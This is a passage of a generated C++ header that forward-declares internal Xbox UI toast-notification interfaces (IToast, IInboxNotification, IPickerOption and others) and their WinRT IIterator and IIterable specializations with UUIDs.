#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxAction_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxActor_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxActor_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IInboxActor;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxActor Windows::Xbox::UI::Internal::ToastNotifications::IInboxActor

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxActor_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxGameType_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxGameType_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IInboxGameType;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxGameType Windows::Xbox::UI::Internal::ToastNotifications::IInboxGameType

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxGameType_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxManager_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxManager_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IInboxManager;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxManager Windows::Xbox::UI::Internal::ToastNotifications::IInboxManager

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxManager_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotification_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotification_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IInboxNotification;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotification Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotification_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotificationOptions_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotificationOptions_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IInboxNotificationOptions;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotificationOptions Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotificationOptions

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotificationOptions_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerOption_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerOption_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IPickerOption;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerOption Windows::Xbox::UI::Internal::ToastNotifications::IPickerOption

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerOption_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerQuickRow_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerQuickRow_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IPickerQuickRow;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerQuickRow Windows::Xbox::UI::Internal::ToastNotifications::IPickerQuickRow

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerQuickRow_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToast_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToast_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IToast;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToast Windows::Xbox::UI::Internal::ToastNotifications::IToast

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToast_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastAction_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastAction_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IToastAction;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastAction Windows::Xbox::UI::Internal::ToastNotifications::IToastAction

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastAction_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastImage_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastImage_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IToastImage;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastImage Windows::Xbox::UI::Internal::ToastNotifications::IToastImage

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastImage_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastInternal_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastInternal_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IToastInternal;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastInternal Windows::Xbox::UI::Internal::ToastNotifications::IToastInternal

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastInternal_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IToastManager;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager Windows::Xbox::UI::Internal::ToastNotifications::IToastManager

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IToastManagerInternal;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal Windows::Xbox::UI::Internal::ToastNotifications::IToastManagerInternal

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastPopupModel_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastPopupModel_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IToastPopupModel;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastPopupModel Windows::Xbox::UI::Internal::ToastNotifications::IToastPopupModel

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastPopupModel_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastQuickRow_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastQuickRow_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IToastQuickRow;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastQuickRow Windows::Xbox::UI::Internal::ToastNotifications::IToastQuickRow

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastQuickRow_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreGroup_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreGroup_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IToastStoreGroup;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreGroup Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreGroup

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreGroup_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreModel_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreModel_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IToastStoreModel;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreModel Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreModel

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreModel_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIVerbQuickRow_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIVerbQuickRow_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IVerbQuickRow;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIVerbQuickRow Windows::Xbox::UI::Internal::ToastNotifications::IVerbQuickRow

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIVerbQuickRow_FWD_DEFINED__

// Parameterized interface forward declarations (C++)

// Collection interface definitions

#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_USE
#define DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("81df8d8f-b35f-5f51-899c-fac608fe1a30"))
IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IInboxAction*> : IIterator_impl<Windows::Xbox::UI::Internal::ToastNotifications::IInboxAction*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IIterator`1<Windows.Xbox.UI.Internal.ToastNotifications.IInboxAction>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IInboxAction*> __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_t;
#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction Windows::Foundation::Collections::__FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction Windows::Foundation::Collections::IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IInboxAction*>
//#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_t Windows::Foundation::Collections::IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IInboxAction*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_USE
#define DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("fe5884e8-2223-5b67-9c66-243f50bac16b"))
IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IInboxAction*> : IIterable_impl<Windows::Xbox::UI::Internal::ToastNotifications::IInboxAction*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IIterable`1<Windows.Xbox.UI.Internal.ToastNotifications.IInboxAction>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IInboxAction*> __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_t;
#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction Windows::Foundation::Collections::__FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction Windows::Foundation::Collections::IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IInboxAction*>
//#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_t Windows::Foundation::Collections::IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IInboxAction*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE
#define DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("8086f782-da4a-5f17-8da4-890475db18be"))
IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*> : IIterator_impl<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IIterator`1<Windows.Xbox.UI.Internal.ToastNotifications.IInboxNotification>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*> __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t;
#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification Windows::Foundation::Collections::__FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification Windows::Foundation::Collections::IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*>
//#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t Windows::Foundation::Collections::IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE
#define DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("0f71b294-f939-54f8-9014-e6c3f47bca36"))
IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*> : IIterable_impl<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IIterable`1<Windows.Xbox.UI.Internal.ToastNotifications.IInboxNotification>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*> __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t;
#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification Windows::Foundation::Collections::__FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification Windows::Foundation::Collections::IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*>
//#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t Windows::Foundation::Collections::IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_USE
#define DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("846b247e-032a-5cff-acd3-1e4102ca5167"))
IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IPickerOption*> : IIterator_impl<Windows::Xbox::UI::Internal::ToastNotifications::IPickerOption*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IIterator`1<Windows.Xbox.UI.Internal.ToastNotifications.IPickerOption>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IPickerOption*> __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_t;
#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption Windows::Foundation::Collections::__FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption Windows::Foundation::Collections::IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IPickerOption*>
//#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_t Windows::Foundation::Collections::IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IPickerOption*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_USE
#define DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("48925dfb-c009-5907-b053-1d96b1dc12ba"))
IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IPickerOption*> : IIterable_impl<Windows::Xbox::UI::Internal::ToastNotifications::IPickerOption*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IIterable`1<Windows.Xbox.UI.Internal.ToastNotifications.IPickerOption>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IPickerOption*> __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_t;
#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption Windows::Foundation::Collections::__FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption Windows::Foundation::Collections::IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IPickerOption*>
//#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_t Windows::Foundation::Collections::IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IPickerOption*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_USE
#define DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("1971d1de-c0c3-587c-898d-3ae72623467d"))
IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IToast*> : IIterator_impl<Windows::Xbox::UI::Internal::ToastNotifications::IToast*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IIterator`1<Windows.Xbox.UI.Internal.ToastNotifications.IToast>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IToast*> __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_t;
#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast Windows::Foundation::Collections::__FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast Windows::Foundation::Collections::IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IToast*>
//#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_t Windows::Foundation::Collections::IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IToast*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_USE
#define DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("67789200-f845-5138-832a-bbc778371290"))
IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IToast*> : IIterable_impl<Windows::Xbox::UI::Internal::ToastNotifications::IToast*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IIterable`1<Windows.Xbox.UI.Internal.ToastNotifications.IToast>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IToast*> __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_t;
#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast Windows::Foundation::Collections::__FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast Windows::Foundation::Collections::IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IToast*>
//#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_t Windows::Foundation::Collections::IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IToast*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_USE
#define DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("15ca047d-acc5-5961-b5e4-8ad588bd2ad1"))
IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IToastImage*> : IIterator_impl<Windows::Xbox::UI::Internal::ToastNotifications::IToastImage*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
